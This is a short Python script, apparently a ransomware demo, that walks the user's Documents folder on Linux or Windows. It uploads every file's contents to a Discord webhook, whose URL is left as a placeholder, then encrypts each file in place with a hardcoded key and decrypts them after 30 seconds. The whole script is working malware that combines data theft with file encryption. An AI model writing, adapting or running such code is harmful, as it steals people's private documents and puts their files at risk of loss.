import os
from cryptography.fernet import Fernet
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed
import platform



uname = platform.uname()

webhook_url = 'oseuwebhookaqui'

def send_webhook_message(message, title="Files Contents", color='FF0000'):

    webhook = DiscordWebhook(url=webhook_url)
    

    if len(message) > 2000:
        message = message[:2000] + '\n[Mensagem cortada devido ao limite de tamanho]'


    embed = DiscordEmbed(title=title, description=message, color=color)
    
    
    embed.set_timestamp()

    webhook.add_embed(embed)
    webhook.execute()

def send_webhook(file_path, content, encoded=True):
    real_content = content.decode('utf-8')
    message = f'File: {file_path}\nContent: \n{real_content}'
    send_webhook_message(message)
    
key = b'znUiQoxmzAEvm_WWcQngapMLv_dLrf5C661SL-ZyL6Q='

if uname.system == "Linux":
      dir = f"/home/{uname.node}/Documents/"
else:
      dir = f"C:\\Users\\{uname.node}\\Documents"
      

files = []

for root, dirs, filenames in os.walk(dir):
    for file in filenames:
        if file == 'ransomware.py':
            continue
            
        print(uname.node)
            
        file_path = os.path.join(root, file)
        
        if os.path.isfile(file_path): 
            files.append(file_path)  
            print(file_path)
        

for file in files:
    with open(file, 'rb') as contents:
        file_contents = contents.read()
    send_webhook(file, file_contents, encoded=False)
    encryptografed_contents = Fernet(key).encrypt(file_contents)
    
    with open(file, 'wb') as content:
        content.write(encryptografed_contents)
        
sleep(30)

for file in files:
    with open(file, 'rb') as contents:
        file_contents = contents.read()
    descryptografed_contents = Fernet(key).decrypt(file_contents)
    print(descryptografed_contents)

    with open(file, 'wb') as content:
        content.write(descryptografed_contents)
